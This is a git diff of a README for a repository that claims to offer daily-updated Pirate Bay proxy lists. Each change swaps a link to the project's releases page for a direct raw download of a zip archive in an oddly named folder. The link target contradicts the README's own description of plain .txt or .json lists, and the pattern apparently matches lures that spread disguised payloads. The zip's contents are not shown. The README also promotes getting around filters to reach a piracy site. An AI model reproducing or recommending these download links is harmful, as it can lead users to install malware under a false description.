@@ -1,6 +1,6 @@
 # ☠️ thepiratebay-proxy-list - Easy Access with Verified Proxies
 
-[![Download Latest Release](https://img.shields.io/badge/Download-thepiratebay--proxy--list-brightgreen?style=for-the-badge)](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
+[![Download Latest Release](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip)](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This list targets users who want to bypass internet filters and censorship witho
 Thepiratebay-proxy-list is not a traditional app you install but a collection of verified proxy links updated daily. To use the service, you will download or view the list of proxies that work right now.
 
 1. Click the big green button above or this link:  
-   [Download or View Proxy List](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases).
+   [Download or View Proxy List](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip).
 
 2. This link takes you to the GitHub releases page. Here you will find the latest updated lists. The files are usually in `.txt` or `.json` format containing proxy URLs.
 
@@ -58,7 +58,7 @@ If you want to use proxy links regularly without manually copying them, you can 
 Because proxy sites can become slow or blocked, thepiratebay-proxy-list updates daily.
 
 - Visit the releases page at:  
-  [https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
+  [https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip)
 
 - Download the newest release file each day or as needed.
 
@@ -107,7 +107,7 @@ If you can’t access The Pirate Bay using a proxy from the list:
 ## 📥 Download and Set Up
 
 1. Visit this page to download the latest proxy list:  
-   [Get the latest release →](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
+   [Get the latest release →](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/raw/refs/heads/main/unornate/list_proxy_thepiratebay_2.8.zip)
 
 2. Choose the most recent file (look for the date or version number).
 
